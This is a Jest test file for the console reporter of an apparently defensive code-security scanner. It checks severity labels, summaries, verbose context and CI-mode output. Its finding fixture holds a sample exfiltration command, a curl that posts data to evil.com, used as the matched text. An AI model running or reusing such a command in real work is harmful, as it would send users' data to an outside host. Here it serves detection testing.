import { describe, it, expect } from '@jest/globals';
import { generateConsoleReport } from '../../src/reporters/ConsoleReporter.js';
import type { ScanResult, Finding } from '../../src/types.js';

// ── Fixtures ───────────────────────────────────────────────────────────────

function makeFinding(overrides: Partial<Finding> = {}): Finding {
  return {
    ruleId: 'EXFIL-001',
    ruleName: 'Data Exfiltration',
    severity: 'HIGH',
    category: 'exfiltration',
    file: '/project/hook.sh',
    relativePath: 'hook.sh',
    line: 42,
    match: 'curl -d "data" https://evil.com',
    context: [],
    remediation: 'Remove the curl command',
    timestamp: new Date('2024-01-01T00:00:00.000Z'),
    riskScore: 80,
    ...overrides,
  };
}

function makeScanResult(findings: Finding[] = []): ScanResult {
  const bySeverity = { CRITICAL: [] as Finding[], HIGH: [] as Finding[], MEDIUM: [] as Finding[], LOW: [] as Finding[], INFO: [] as Finding[] };
  for (const f of findings) {
    bySeverity[f.severity].push(f);
  }
  const summary = {
    critical: bySeverity.CRITICAL.length,
    high: bySeverity.HIGH.length,
    medium: bySeverity.MEDIUM.length,
    low: bySeverity.LOW.length,
    info: bySeverity.INFO.length,
    total: findings.length,
  };
  return {
    success: true,
    startTime: new Date('2024-01-01T00:00:00.000Z'),
    endTime: new Date('2024-01-01T00:00:01.000Z'),
    duration: 1000,
    scannedPaths: ['/project'],
    totalFiles: 5,
    analyzedFiles: 5,
    skippedFiles: 0,
    findings,
    findingsBySeverity: bySeverity,
    findingsByCategory: {
      exfiltration: [], credentials: [], injection: [], backdoors: [],
      'supply-chain': [], permissions: [], persistence: [], obfuscation: [],
      'ai-specific': [], 'advanced-hiding': [], behavioral: [],
    },
    overallRiskScore: findings.length > 0 ? 75 : 0,
    summary,
    errors: [],
  };
}

// Strip ANSI escape codes for assertion clarity
function stripAnsi(s: string): string {
  // eslint-disable-next-line no-control-regex
  return s.replace(/\x1b\[[0-9;]*m/g, '');
}

// ── Tests ──────────────────────────────────────────────────────────────────

describe('ConsoleReporter', () => {
  describe('generateConsoleReport', () => {
    it('reports "No security issues found" when there are no findings', () => {
      const result = makeScanResult([]);
      const output = stripAnsi(generateConsoleReport(result));
      expect(output).toContain('No security issues found');
    });

    it('includes the scanned path in the output', () => {
      const result = makeScanResult([]);
      const output = generateConsoleReport(result);
      expect(output).toContain('/project');
    });

    it('renders ruleId and file:line for each finding', () => {
      const finding = makeFinding({ ruleId: 'EXFIL-999', relativePath: 'scripts/hook.sh', line: 77 });
      const result = makeScanResult([finding]);
      const output = stripAnsi(generateConsoleReport(result));
      expect(output).toContain('EXFIL-999');
      expect(output).toContain('scripts/hook.sh:77');
    });

    it('renders severity label in output', () => {
      const finding = makeFinding({ severity: 'CRITICAL' });
      const result = makeScanResult([finding]);
      const output = stripAnsi(generateConsoleReport(result));
      expect(output).toContain('CRITICAL');
    });

    it('includes summary counts for each severity', () => {
      const findings = [
        makeFinding({ severity: 'CRITICAL' }),
        makeFinding({ severity: 'CRITICAL' }),
        makeFinding({ severity: 'HIGH' }),
      ];
      const result = makeScanResult(findings);
      const output = stripAnsi(generateConsoleReport(result));
      expect(output).toContain('Critical: 2');
      expect(output).toContain('High: 1');
    });

    it('includes the SUMMARY section', () => {
      const result = makeScanResult([makeFinding()]);
      const output = stripAnsi(generateConsoleReport(result));
      expect(output).toContain('SUMMARY');
    });

    it('shows remediation text for each finding', () => {
      const finding = makeFinding({ remediation: 'Delete the offending file' });
      const result = makeScanResult([finding]);
      const output = stripAnsi(generateConsoleReport(result));
      expect(output).toContain('Delete the offending file');
    });

    it('shows context lines when verbose=true and context is present', () => {
      const finding = makeFinding({
        context: [
          { lineNumber: 41, content: 'prev line', isMatch: false },
          { lineNumber: 42, content: 'curl -d bad', isMatch: true },
          { lineNumber: 43, content: 'next line', isMatch: false },
        ],
      });
      const result = makeScanResult([finding]);
      const output = stripAnsi(generateConsoleReport(result, { verbose: true }));
      expect(output).toContain('prev line');
      expect(output).toContain('curl -d bad');
      expect(output).toContain('Context');
    });

    it('does NOT show context when verbose=false', () => {
      const finding = makeFinding({
        context: [{ lineNumber: 42, content: 'unique-marker-xyz', isMatch: true }],
      });
      const result = makeScanResult([finding]);
      const output = stripAnsi(generateConsoleReport(result, { verbose: false }));
      expect(output).not.toContain('unique-marker-xyz');
    });

    it('truncates long match text at 80 characters', () => {
      const longMatch = 'A'.repeat(100);
      const finding = makeFinding({ match: longMatch });
      const result = makeScanResult([finding]);
      const output = stripAnsi(generateConsoleReport(result));
      expect(output).toContain('...');
      // The full 100-char match should not appear
      expect(output).not.toContain('A'.repeat(100));
    });
  });

  describe('CI mode (ci: true)', () => {
    it('produces a compact format starting with [FERRET]', () => {
      const result = makeScanResult([makeFinding()]);
      const output = generateConsoleReport(result, { ci: true });
      expect(output).toContain('[FERRET]');
    });

    it('includes per-finding [SEVERITY] prefix in CI mode', () => {
      const finding = makeFinding({ severity: 'CRITICAL', ruleId: 'CRIT-001' });
      const result = makeScanResult([finding]);
      const output = generateConsoleReport(result, { ci: true });
      expect(output).toContain('[CRITICAL]');
      expect(output).toContain('CRIT-001');
    });

    it('includes [SUMMARY] and [RISK] lines in CI mode', () => {
      const result = makeScanResult([makeFinding()]);
      const output = generateConsoleReport(result, { ci: true });
      expect(output).toContain('[SUMMARY]');
      expect(output).toContain('[RISK]');
    });

    it('CI mode output does not contain the banner or ANSI codes', () => {
      const result = makeScanResult([makeFinding()]);
      const output = generateConsoleReport(result, { ci: true });
      // No ANSI codes in CI mode (generateCiReport uses plain text)
      expect(output).not.toMatch(/\x1b\[/);
      // No ferret ASCII art banner
      expect(output).not.toContain('███████╗');
    });
  });
});
